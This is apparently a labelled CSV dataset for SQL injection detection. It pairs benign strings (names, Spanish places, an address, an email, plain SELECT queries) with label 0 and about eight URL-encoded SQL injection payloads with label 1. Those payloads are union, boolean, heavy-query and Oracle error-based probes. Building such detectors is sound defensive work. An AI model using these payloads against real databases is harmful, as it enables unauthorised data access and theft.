Query,Label
crabe,0
acr7m6nia,0
1%27%20%20%29%20%20%20where%202852%20%20%3D%20%202852,1
doralie,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%206240%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27rgyc%27%20%20%3D%20%20%27rgyc,1
-9638%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20elt%20%20%28%20%201032%20%20%3D%20%201032%2C3623%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%203679%20%20%3D%20%203679,1
foulk@eonon.com.es,0
1%22%20%20%29%20%20%20where%201699%20%20%3D%20%201699%20or%204915%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
darnall,0
-8301%27%20%20%29%20%20%20union%20all%20select%201806%2C1806--,1
SELECT * FROM kids ORDER BY circle,0
rozaln del monte,0
SELECT * FROM steam WHERE using = 'fellow' LIMIT 3,0
dulcera,0
yunquera de henares,0
-1763%25%22%20or%20%20%20%28%20%208459%20%20%3D%20%208459%20%20%29%20%20%2A4906%20and%20%22%25%22%20%20%3D%20%20%22,1
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0
1%27%20%20%29%20%20%20or%205286%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29,1
sedran,0
"c/ gallarza, 147",0
91394289v,0
1%20%20%29%20%20%20where%203381%20%20%3D%20%203381%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20--,1
